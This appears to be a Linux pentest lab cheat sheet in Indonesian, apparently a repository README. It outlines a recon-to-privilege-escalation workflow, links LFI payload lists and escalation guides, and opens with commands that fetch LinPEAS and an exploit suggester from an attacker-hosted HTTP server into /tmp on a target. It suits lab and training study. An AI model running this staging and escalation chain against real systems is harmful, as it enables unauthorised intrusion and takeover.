# Cheat Sheet — Lab Reference

Ingat perintah berikut:
```bash
cd Downloads
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
python -m http.server 899

cd /tmp
wget http://69.69.69.69:899/linpeas.sh
wget http://69.69.69.69:899/linux-exploit-suggester.sh
``` 

* LinPEAS = https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
* LES = https://github.com/The-Z-Labs/linux-exploit-suggester
* GTFObins = https://gtfobins.org/gtfobins/
* Payload LFI = https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
* Cek https://medium.com/fmisec/injeksi-file-access-log-untuk-eskalasi-kerentanan-lfi-ke-rce-f0fc782b960d
* Cek https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1/
* Cek https://support.scc.suse.com/s/kb/passwordless-SSH-login-to-a-remote-server-with-DSA-client-public-key-keeps-asking-user-for-password?language=en_US
* Tomcat : https://hackviser.com/tactics/pentesting/services/tomcat
* Cron Job : https://snehbavarva.medium.com/privilege-escalation-techniques-series-linux-cron-jobs-a5b797b424b4

Contekan dari sebelah:
Referensi teknik & payload:
recon → foothold → reverse shell → enumerasi → privilege escalation → proof.

## Struktur Direktori

```
.
├── 00-recon/
│   ├── Network_Discovery.md
│   ├── Port_Scanning.md
│   └── Web_Directory_Bruteforce.md
├── 01-initial-foothold/
│   ├── SQL_Injection.md
│   ├── File_Upload.md
│   ├── SSTI.md
│   ├── LFI.md
│   └── Command_Injection.md
├── 02-reverse-shell/
│   ├── Listener.md
│   ├── Payloads.md
│   ├── Msfvenom.md
│   └── Stabilize_TTY.md
├── 03-enumeration/
│   ├── LinPEAS.md
│   ├── Manual_Enumeration.md
│   └── GTFOBins.md
├── 04-privilege-escalation/
│   ├── Kernel_LPE.md
│   ├── SUID.md
│   ├── Sudo.md
│   ├── Weak_Permission.md
│   └── Writable_Cron.md
└── 05-proof/
    └── Submission.md
```

## Daftar Isi

| Folder | Topik |
|--------|-------|
| `00-recon/` | Network discovery, port scan, web directory bruteforce |
| `01-initial-foothold/` | SQLi, file upload, SSTI, LFI, command injection |
| `02-reverse-shell/` | Listener, payloads, msfvenom, stabilize TTY |
| `03-enumeration/` | LinPEAS, manual enum, GTFOBins |
| `04-privilege-escalation/` | Kernel LPE, SUID, sudo, cron, weak permission |
| `05-proof/` | Bukti submission (id + hostname) |

## Alur Umum

```text
Recon (nmap) → Web enum → Foothold (SQLi/upload/SSTI/LFI/cmdi)

Source: https://github.com/w4h4z/Pentest-Cheat-Sheet/
→ Reverse shell + stabilize → Enum (linpeas + manual) → GTFOBins
→ Privesc (SUID/sudo/cron/weak-perm/KERNEL dirtyfrag-copyfail) →  proof
```
